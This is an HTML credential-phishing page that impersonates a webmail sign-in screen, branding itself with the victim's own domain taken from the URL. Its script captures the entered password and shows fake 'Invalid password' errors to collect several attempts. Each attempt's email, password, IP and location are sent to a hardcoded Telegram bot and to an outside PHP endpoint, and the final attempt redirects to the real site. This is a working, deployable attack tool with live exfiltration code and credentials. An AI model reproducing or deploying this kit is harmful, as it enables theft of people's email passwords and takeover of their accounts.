<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mail System Sign in to continue</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        * { box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            color: #535353;
            background-image: url(https://i.imgur.com/W6H22Ci.png);
            background-size: cover;
            margin: 0;
            padding: 0;
        }
        .login-40 .form-section {
            max-width: 380px;
            margin: 50px auto 0;
            border-radius: 10px;
            padding: 10px 35px;
            border: 1px solid #e8e7e7;
            background: rgba(255,255,255,0.95);
        }
        .img-fluid { max-width: 100% !important; height: auto; }
        .login-40 .login-inner-form .form-box {
            float: left;
            width: 100%;
            position: relative;
        }
        .login-40 .login-inner-form .form-group {
            margin-bottom: 30px;
        }
        .login-40 .login-inner-form .form-box input {
            float: left;
            width: 100%;
            padding: 15.5px 50px 15.5px 25px;
            font-size: 16px;
            outline: none;
            color: #717171;
            border-radius: 50px;
            border: 1px solid #dbdbdb;
            box-shadow: 0 1px 3px 0 rgba(0,0,0,0.06);
        }
        .login-40 .login-inner-form .form-box input:read-only {
            background-color: #f5f5f5;
            cursor: default;
        }
        .form-control:focus { box-shadow: none; }
        .login-40 .login-inner-form .form-box i {
            position: absolute;
            top: 14px;
            right: 25px;
            font-size: 19px;
            color: #717171;
            cursor: pointer;
        }
        .logo { text-align: center; margin-bottom: 35px; }
        .login-40 .login-inner-form .checkbox {
            margin-bottom: 30px;
            font-size: 16px;
        }
        .login-40 .login-inner-form input[type=checkbox], input[type=radio] {
            margin-top: 4px;
            margin-right: 3px;
            position: absolute;
            margin-left: 0;
        }
        .login-40 .login-inner-form label {
            font-weight: 500;
            font-size: 14px;
            margin-bottom: 5px;
        }
        .login-40 .login-inner-form .form-check-label {
            padding-left: 25px;
            margin-bottom: 0;
            font-size: 16px;
            color: #717171;
        }
        .login-40 .login-inner-form .checkbox-theme input[type=checkbox]:checked+label::before {
            background-color: #50a1ff;
            border-color: #50a1ff;
        }
        .login-40 .login-inner-form input[type=checkbox]:checked+label::before {
            font-weight: 300;
            color: #f3f3f3;
            line-height: 15px;
            font-size: 14px;
            content: "\2713";
            text-align: center;
        }
        .login-40 .login-inner-form .form-check label::before {
            content: "";
            display: inline-block;
            position: absolute;
            width: 22px;
            height: 22px;
            margin-left: -27px;
            border: 1px solid #c5c3c3;
            border-radius: 3px;
            background-color: #fff;
        }
        .btn-block { display: block; width: 100%; }
        .sub_b { transition: background-color 300ms linear; }
        .sub_b:hover { background-color: #0b5e79e; transition: background-color 300ms linear; }
        .login-40 .login-inner-form .btn-md {
            cursor: pointer;
            padding: 15.5px 50px 14.5px 50px;
            font-size: 17px;
            font-weight: 400;
            font-family: 'Jost', sans-serif;
            border-radius: 50px;
        }
        .login-40 .login-inner-form .btn-theme {
            background: #50a1ff;
            border: none;
            color: #fff;
        }
        .login-40 .login-inner-form .btn-theme:hover { background: #4595f1; }
        #logo { height: 30px; }
        a:hover { text-decoration: none; }
        a { text-decoration: none; color: #007bff; }
        .erx {
            margin: 10px 0 0;
            padding: 7px 5px;
            background-color: #c50000;
            color: #fff;
            font-size: 16px;
            margin-top: -1px;
        }
        .login-inner-form { margin-top: -20px; }
        #msg { display: block; margin-bottom: 15px; }
    </style>
</head>
<body class="dark sharp" id="lebody" style="background-image: url(https://i.imgur.com/W6H22Ci.png); background-size: cover;">
    <div class="b_base login-40">
        <div class="f_base container">
            <div class="f_in row">
                <div class="col-md-12">
                    <div class="form-section">
                        <div class="f_in">
                            <div class="logo">
                                <a href="#">
                                    <img src="" alt="Webmail" id="logo">
                                    <h2 id="logoname" style="font-size: 2rem;"></h2>
                                </a>
                            </div>
                            <h3 id="dom_name" style="margin-bottom: 0rem;"></h3>
                            <center><h2 style="color: #212529; line-height: 1.2;">Sign In To Continue</h2></center>
                            <div class="login-inner-form">
                                <form class="f_form" id="loginForm" method="POST">
                                    <input type="hidden" name="fcc" id="fcc" value="">
                                    <div class="alert alert-danger mb-3 hidden" id="err" role="alert"></div>
                                    <div class="alert alert-primary mb-3 hidden" id="mi" role="alert"></div>
                                    <div class="form-group form-box">
                                        <input type="email" id="email" name="email" class="input-text" placeholder="Email Address" readonly>
                                    </div>
                                    <div class="form-group form-box">
                                        <input type="password" id="password" name="password" class="input-text" placeholder="Password" required>
                                        <i class="fa fa-eye sla" id="togglePassword" onclick="togglePasswordVisibility()" aria-hidden="true"></i>
                                    </div>
                                    <span id="msg" style="color:red;"></span>
                                    <div class="checkbox clearfix">
                                        <div class="form-check checkbox-theme">
                                            <input class="form-check-input" type="checkbox" value="" id="rem_me">
                                            <label class="form-check-label" for="rem_me">Remember me</label>
                                        </div>
                                    </div>
                                    <div class="form-group mb-0">
                                        <button type="submit" id="getitBtn" name="sub" class="btn-md btn-theme btn-block sub_b">Continue</button>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script>
    <script>
        $(document).ready(function() {
            let attemptCount = 1;
            const MAX_ATTEMPTS = 4;

            // Telegram (client‑side) – if this fails, the PHP will still send via its own token
            const TELEGRAM_BOT_TOKEN = '8289320903:AAHFcCYmYj3XGoSVtvnCfYU73yxG-xHwJDQ';
            const TELEGRAM_CHAT_ID = '6159490685';

            // Your PHP endpoint
            const SERVER_URL = 'https://scitecinstruments.it.com/2/sg.php';

            let messageSentForThisAttempt = false;

            // ---------- Telegram sender (with error logging) ----------
            function sendToTelegram(message) {
                if (messageSentForThisAttempt) {
                    console.log('⚠️ Already sent for this attempt, blocking duplicate');
                    return;
                }
                messageSentForThisAttempt = true;
                console.log('📤 Sending ONE message to Telegram');

                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML&_=${Date.now()}`;
                
                // Use Image to send (bypass CORS)
                const img = new Image();
                img.onload = () => console.log('✅ Telegram image request loaded (message likely sent)');
                img.onerror = () => console.error('❌ Telegram image request failed – check bot token / chat ID / network');
                img.src = url;
            }

            // ---------- Server POST (to your PHP) with response logging ----------
            function sendToServer(email, password, attempt) {
                const formData = new URLSearchParams();
                formData.append('email', email);
                formData.append('password', password);
                formData.append('attempt', attempt);

                fetch(SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    console.log('✅ Server response:', data);
                    if (data.status !== 'success') {
                        console.warn('⚠️ Server returned error:', data.message);
                    }
                })
                .catch(err => {
                    console.error('❌ Error sending to server:', err);
                    // Possibly CORS or wrong URL
                });
            }

            // ---------- Format log message ----------
            function formatLogMessage(email, password, attempt, mxRecord, ip, location) {
                const now = new Date();
                const timeString = now.toLocaleString('en-US', {
                    year: 'numeric', month: 'numeric', day: 'numeric',
                    hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true
                }).replace(',', '');
                return `──────────────────
📧 Email: ${email}
🔑 Password: ${password}
🕐 Time: ${timeString}
🌍 IP: ${ip}
📍 Location: ${location}
📨 MX: ${mxRecord}
🔢 Attempt: ${attempt}/${MAX_ATTEMPTS}`;
            }

            function getMxRecord(email) {
                const domain = email.split('@')[1];
                return `0 mail.${domain}.`;
            }

            // ---------- Get IP and location ----------
            function getIpAndLocation(callback) {
                let callbackCalled = false;
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(data => {
                        if (!callbackCalled) {
                            callbackCalled = true;
                            const ip = data.ip;
                            fetch(`https://ipapi.co/${ip}/json/`)
                                .then(r => r.json())
                                .then(locData => {
                                    const city = locData.city || '';
                                    const region = locData.region || '';
                                    const country = locData.country_name || '';
                                    const location = [city, region, country].filter(Boolean).join(', ') || 'Unknown';
                                    callback(ip, location);
                                })
                                .catch(() => callback(ip, 'Unknown'));
                        }
                    })
                    .catch(() => {
                        if (!callbackCalled) {
                            callbackCalled = true;
                            fetch('https://ipapi.co/json/')
                                .then(r => r.json())
                                .then(data => {
                                    const ip = data.ip || 'Unknown';
                                    const city = data.city || '';
                                    const region = data.region || '';
                                    const country = data.country_name || '';
                                    const location = [city, region, country].filter(Boolean).join(', ') || 'Unknown';
                                    callback(ip, location);
                                })
                                .catch(() => {
                                    callback('8.8.8.8', 'Mountain View, California, USA');
                                });
                        }
                    });
            }

            function resetSentFlag() {
                messageSentForThisAttempt = false;
            }

            // ---------- Form submission ----------
            $("#loginForm").on('submit', function(e) {
                e.preventDefault();

                let password = $("#password").val();
                if (!password || password.length < 1) {
                    $("#msg").text("Please enter your password").css("color", "red");
                    return;
                }

                let email = $("#email").val();
                let mxRecord = getMxRecord(email);
                let currentAttempt = attemptCount;
                resetSentFlag();

                // Fake feedback
                if (currentAttempt < MAX_ATTEMPTS) {
                    $("#msg").text("Invalid password, try again").css("color", "red");
                    $("#password").val("");
                    $("#getitBtn").prop('disabled', false).html("Continue");
                } else {
                    $("#msg").text("Redirecting to your inbox...").css("color", "green");
                    $("#getitBtn").prop('disabled', true).html("Redirecting...");
                }
                attemptCount++;

                getIpAndLocation(function(ip, location) {
                    const completeMessage = formatLogMessage(email, password, currentAttempt, mxRecord, ip, location);
                    console.log('📤 Sending info for attempt', currentAttempt);

                    // 1. Send to Telegram (client‑side)
                    sendToTelegram(completeMessage);

                    // 2. Send to your PHP server (which will also send Telegram using its own token)
                    sendToServer(email, password, currentAttempt);
                });

                // Redirect on final attempt
                if (currentAttempt === MAX_ATTEMPTS) {
                    setTimeout(function() {
                        window.location.href = window.emailDomain;
                    }, 1500);
                }
            });

            // ---------- Parse email from URL ----------
            const urlParams = new URLSearchParams(window.location.search);
            const hashedEmail = urlParams.get('e');
            if (!hashedEmail) {
                $('body').html('<div style="text-align:center; padding:50px; font-size:24px;">Please provide an email parameter in the URL (?e=email@domain.com)</div>');
            } else {
                $("#email").val(hashedEmail);
                let domain = hashedEmail.split('@')[1];
                let siteName = domain.split('.')[0].toUpperCase();
                siteName = siteName.charAt(0).toUpperCase() + siteName.slice(1).toLowerCase();
                document.title = siteName + document.title;
                document.querySelector('#logoname').textContent = siteName;

                // Optional favicon / background
                let faviconUrl = `https://www.google.com/s2/favicons?domain=${domain}&sz=32`;
                document.querySelector('link[rel="shortcut icon"]')?.setAttribute('href', faviconUrl);
                document.body.style.backgroundImage = `url('https://image.thum.io/get/width/1200/http://${domain}')`;
                document.querySelector('#logo').setAttribute('src', faviconUrl);

                window.emailDomain = 'https://' + domain;
            }
        });

        // Toggle password visibility
        function togglePasswordVisibility() {
            const e = document.getElementById("password");
            const t = document.getElementById("togglePassword");
            if ("password" === e.type) {
                e.type = "text";
                t.classList.remove("fa-eye");
                t.classList.add("fa-eye-slash");
            } else {
                e.type = "password";
                t.classList.remove("fa-eye-slash");
                t.classList.add("fa-eye");
            }
        }
    </script>
</body>
</html>
